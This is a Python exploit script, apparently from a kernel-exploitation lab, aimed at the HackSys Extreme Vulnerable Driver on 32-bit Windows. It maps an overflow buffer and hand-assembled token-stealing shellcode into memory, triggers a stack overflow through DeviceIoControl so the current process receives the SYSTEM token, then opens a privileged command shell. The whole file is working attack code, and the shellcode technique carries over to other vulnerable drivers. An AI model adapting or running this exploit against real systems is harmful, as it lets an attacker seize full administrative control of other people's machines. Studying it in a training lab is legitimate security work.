import ctypes,os,struct,sys
from ctypes import *
import subprocess
from ctypes.wintypes import *
from win32com.shell import shell

ntdll=windll.ntdll
kernel32=windll.kernel32

GENERIC_READ=0x80000000
GENERIC_WRITE=0x40000000
OPEN_EXISTING=3
MEM_COMMIT=0x00001000
MEM_RESERVE=0x00002000
PAGE_EXECUTE_READWRITE=0x40
STATUS_SUCCESS=0

def alloc_memory(addr,payload_size,payload):
	print("[*] Allocating memory at "+hex(addr))
	c_addr=c_int(addr)
	c_payload_size=c_int(payload_size)
	ntdll.NtAllocateVirtualMemory.argtypes=[c_int,
						POINTER(c_int),
						c_ulong,
						POINTER(c_int),
						c_int,
						c_int]
	ret=ntdll.NtAllocateVirtualMemory(0xffffffff, # ProcessHandle
				      byref(c_addr), #Baseaddress
					0, #Zerobits(not used)
					byref(c_payload_size), #RegionSize
					MEM_COMMIT|MEM_RESERVE, #AllocationType
					PAGE_EXECUTE_READWRITE) #Protect
	if ret!=STATUS_SUCCESS:
		print("[-] Allocation failed! Error: "+str(ctypes.GetLastError()))
		sys.exit()	
	written=c_ulong()
	ret=kernel32.WriteProcessMemory(0xffffffff,#hProcess
					addr,#lpBaseAddress
					payload,#lpBuffer
					payload_size,#nSize
					byref(written))#lpNumberOfBytesWritten
					
	if ret==0:
		print("[-] Write to allocated memory failed! Error: "+str(ctypes.GetLastError()))
		sys.exit()

def token_stealing_shellcode():
    shellcode=(
        "\x60" #pushad
        "\x64\xA1\x24\x01\x00\x00" # mov eax,fs:[0x124]; get KTHREAD
        "\x8b\x40\x50" # mov eax,[eax+0x50]; get  EPROCESS
        "\x89\xc1"# mov ecx,eax
        "\xBA\x04\x00\x00\x00"#mov edx,4
        "\x8B\x80\xB8\x00\x00\x00"#mov eax,[eax+0xb8]; get FD
        "\x2D\xB8\x00\x00\x00"#sub eax,0xb8; get EPROCESS
        "\x39\x90\xB4\x00\x00\x00"# cmp [eax+0xb4],edx; check PID
        "\x0F\x85\xE9\xFF\xFF\xFF"# jnz -19
        "\x8B\x80\xF8\x00\x00\x00"#mov eax,[eax+0xf8]; get token
        "\x89\x81\xF8\x00\x00\x00"#mov [ecx+0xf8],eax; rewrite token
        "\x61" #popad
        "\x31\xC0" #eax=0
        "\x5D" # pop ebp
	"\xC2\x08\x00"  #ret     
    )
    return shellcode

def trigger_overflow():
	lpBytesReturned=c_ulong()
	handle=kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", #lpFileName
			GENERIC_READ|GENERIC_WRITE, #dwDesiredAccess
			0, #dwShareMode
			None, #lpSecurityAttributes
			OPEN_EXISTING, #dwCreationDisposition
			0, #DwFileAttributes,
			None) #hTemplateFile
	
	if not handle or handle==-1:
		print("[-] Failed to acquire driver handle: Error"+str(ctypes.GetLastError()))
		sys.exit()

	shellcode_addr=0x42420000
	payload_addr=0x41410000
	payload="A"*0x820+struct.pack("<L",shellcode_addr)
	alloc_memory(payload_addr,len(payload),payload)
	shellcode=token_stealing_shellcode()
	alloc_memory(shellcode_addr,len(shellcode),shellcode)
	kernel32.DeviceIoControl(handle, #hDevice
				2236419, #dwIoControlCode
				payload_addr, #lpInBuffer
				len(payload), #nInBufferSize
				None, #lpOutBuffer
				0, #nOutBufferSize
				byref(lpBytesReturned), #lpBytesReturned
				None) #lpOverlapped
	if shell.IsUserAnAdmin():
		print("[+] Privilage escalation achieved!")
		print("[+] Here's Your Root Shell!")
		#os.system('cmd.exe')
		new_process=subprocess.Popen("start cmd",shell=True)
	else:
		print("[-] Privilage escalation failed!")


if __name__=='__main__':
	trigger_overflow()

